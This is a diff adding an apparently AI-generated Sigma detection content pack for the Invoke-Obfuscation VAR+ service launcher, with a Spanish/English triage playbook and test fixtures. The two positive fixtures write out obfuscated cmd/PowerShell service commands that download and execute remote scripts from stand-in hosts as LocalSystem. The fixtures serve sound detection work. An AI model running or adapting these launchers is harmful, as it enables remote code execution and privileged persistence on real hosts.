@@ -1,0 +1,137 @@
+{
+  "rule": {
+    "id": "8ca7004b-e620-4ecb-870e-86129b5b8e75",
+    "title": "Invoke-Obfuscation VAR+ Launcher - System",
+    "level": "high",
+    "status": "test",
+    "author": "Jonathan Cheong, oscd.community",
+    "path": "windows/builtin/system/service_control_manager/win_system_invoke_obfuscation_var_services.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/builtin/system/service_control_manager/win_system_invoke_obfuscation_var_services.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1027",
+      "T1059.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se instaló un servicio nuevo (evento 7045 del Service Control Manager) cuyo ImagePath ejecuta cmd con un comando \"set\" y el operador de formato -f. Este patrón coincide con el launcher VAR+ de Invoke-Obfuscation, que guarda PowerShell ofuscado en una variable de entorno.",
+      "what_it_detects": "Eventos 7045 del log System en los que ImagePath contiene 'cmd', '\"set' y '-f', además de '/c' o '/r'. Es decir, un servicio que define una variable de entorno y lanza PowerShell ofuscado con cadenas de formato.",
+      "why_it_matters": "Crear servicios es una técnica común para ejecutar código como SYSTEM o moverse lateralmente con herramientas tipo PsExec. La ofuscación (T1027) oculta la ejecución de PowerShell (T1059.001), que muchas veces descarga y ejecuta un payload en memoria.",
+      "triage_steps": [
+        "Revise el ImagePath completo, desofusque las cadenas -f y la variable definida con set, y determine qué comando de PowerShell se ejecuta realmente.",
+        "Identifique ServiceName, AccountName y StartType. Los nombres aleatorios y los servicios que corren como LocalSystem aumentan la sospecha.",
+        "Busque eventos de inicio de sesión 4624 tipo 3 en el mismo host +/- 15 minutos para identificar el usuario y la IP de origen que crearon el servicio.",
+        "Correlacione en EDR o Sysmon los procesos hijos de services.exe, cmd.exe y powershell.exe en el mismo host y periodo.",
+        "Extraiga las URL o dominios del comando desofuscado y búsquelos en logs de proxy y DNS de toda la organización.",
+        "Revise si hay alertas previas para el mismo host, usuario o IP de origen, y si otros hosts tienen servicios con ImagePath similares."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos; el software legítimo casi nunca instala servicios con PowerShell ofuscado mediante set y -f.",
+        "Ejercicios de red team o pruebas de detección autorizadas que usan Invoke-Obfuscation; confírmelos con el equipo responsable."
+      ],
+      "response_steps": [
+        "Confirme la actividad maliciosa desofuscando el comando y validando con el responsable del host que no se trata de una prueba autorizada.",
+        "Aísle el endpoint desde el EDR y deshabilite la cuenta usada para crear el servicio si parece comprometida.",
+        "Después de preservar la evidencia (export del evento, ImagePath, memoria si es posible), detenga y elimine el servicio.",
+        "Bloquee los dominios e IP del payload y busque el mismo indicador en otros hosts.",
+        "Rote las credenciales afectadas y restaure el host desde una imagen confiable si se confirma ejecución del payload."
+      ],
+      "severity_rationale": "El nivel high es adecuado porque un servicio con PowerShell ofuscado casi nunca es legítimo e implica ejecución con privilegios elevados."
+    },
+    "en": {
+      "summary": "A new service was installed (Service Control Manager event 7045) whose ImagePath runs cmd with a \"set\" command and the -f format operator. This pattern matches the Invoke-Obfuscation VAR+ launcher, which stores obfuscated PowerShell in an environment variable.",
+      "what_it_detects": "System log 7045 events where ImagePath contains 'cmd', '\"set' and '-f', plus '/c' or '/r'. In other words, a service that sets an environment variable and launches PowerShell obfuscated with format strings.",
+      "why_it_matters": "Service creation is a common way to run code as SYSTEM or move laterally with PsExec-style tools. Obfuscation (T1027) hides PowerShell execution (T1059.001), which often downloads and runs a payload in memory.",
+      "triage_steps": [
+        "Read the full ImagePath, deobfuscate the -f format strings and the variable defined with set, and work out which PowerShell command actually runs.",
+        "Identify ServiceName, AccountName and StartType. Random names and services running as LocalSystem make it more suspicious.",
+        "Look for 4624 type 3 logons on the same host within +/- 15 minutes to find the user and source IP that created the service.",
+        "In EDR or Sysmon, check child processes of services.exe, cmd.exe and powershell.exe on the same host in that window.",
+        "Pull URLs or domains from the deobfuscated command and search for them in proxy and DNS logs across the organization.",
+        "Check for earlier alerts on the same host, user or source IP, and for similar service ImagePaths on other hosts."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives. Legitimate software rarely installs services with PowerShell obfuscated through set and -f.",
+        "Authorized red team exercises or detection tests that use Invoke-Obfuscation. Confirm with the team running them."
+      ],
+      "response_steps": [
+        "Confirm it is malicious by deobfuscating the command and checking with the host owner that it is not an authorized test.",
+        "Isolate the endpoint through EDR. Disable the account that created the service if it looks compromised.",
+        "Preserve evidence first (event export, ImagePath, memory if possible), then stop and delete the service.",
+        "Block the payload's domains and IPs, and hunt for the same indicator on other hosts.",
+        "Rotate affected credentials. Reimage the host from a trusted image if the payload is confirmed to have run."
+      ],
+      "severity_rationale": "High fits because a service running obfuscated PowerShell is almost never legitimate, and it means code ran with elevated privileges."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Service installed with the Invoke-Obfuscation VAR+ launcher: cmd /C \"set ... with PowerShell -f format strings",
+        "event": {
+          "Provider_Name": "Service Control Manager",
+          "EventID": 7045,
+          "Channel": "System",
+          "Computer": "WS-0142.andes.example.com",
+          "ServiceName": "xKqTzv",
+          "ImagePath": "C:\\winDoWs\\SySTeM32\\cmd.Exe /C\"SET NOtI=Invoke-Expression (New-Object Net.WebClient).DownloadString('http://www.example.com/a.ps1')&& PowERshElL -NOl ${exECUtIONCOnTEXT}.\\\"IN`VO`KecOmMaND\\\".\\\"inVo`KES`crIPt\\\"( ( [Environment]::(\\\"{1}{0}\\\" -f'iable','GetEnvironmentVar').Invoke(( \\\"{0}{1}\\\"-f'n','oti' ),( \\\"{0}{1}\\\" -f'pRoC','esS') )) )\"",
+          "ServiceType": "user mode service",
+          "StartType": "demand start",
+          "AccountName": "LocalSystem"
+        }
+      },
+      {
+        "description": "Variant using cmd /r and lowercase \"set with format operator",
+        "event": {
+          "Provider_Name": "Service Control Manager",
+          "EventID": 7045,
+          "Channel": "System",
+          "Computer": "SRV-FILE-02.andes.example.com",
+          "ServiceName": "PSUpdSvc",
+          "ImagePath": "cmd.exe /r \"set SlDb=Invoke-Expression (New-Object Net.WebClient).DownloadString('http://198.51.100.20/s')&& powershell .( (\\\"{0}{1}\\\" -f 'ie','x') ) ( (gci ('env:SlDb')).Value )\"",
+          "ServiceType": "user mode service",
+          "StartType": "auto start",
+          "AccountName": "LocalSystem"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate vendor service wrapped in cmd /c with a -f option but no \"set command",
+        "event": {
+          "Provider_Name": "Service Control Manager",
+          "EventID": 7045,
+          "Channel": "System",
+          "Computer": "WS-0142.andes.example.com",
+          "ServiceName": "VendorBackupAgent",
+          "ImagePath": "C:\\Windows\\System32\\cmd.exe /c \"C:\\Program Files\\Vendor\\backup-agent.exe\" -f C:\\ProgramData\\Vendor\\agent.conf",
+          "ServiceType": "user mode service",
+          "StartType": "auto start",
+          "AccountName": "LocalSystem"
+        }
+      },
+      {
+        "description": "Normal service installation with a direct executable path",
+        "event": {
+          "Provider_Name": "Service Control Manager",
+          "EventID": 7045,
+          "Channel": "System",
+          "Computer": "SRV-APP-01.andes.example.com",
+          "ServiceName": "Contoso Update Service",
+          "ImagePath": "\"C:\\Program Files\\Contoso\\Update\\ContosoUpdate.exe\" /svc",
+          "ServiceType": "user mode service",
+          "StartType": "auto start",
+          "AccountName": "LocalSystem"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:12+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
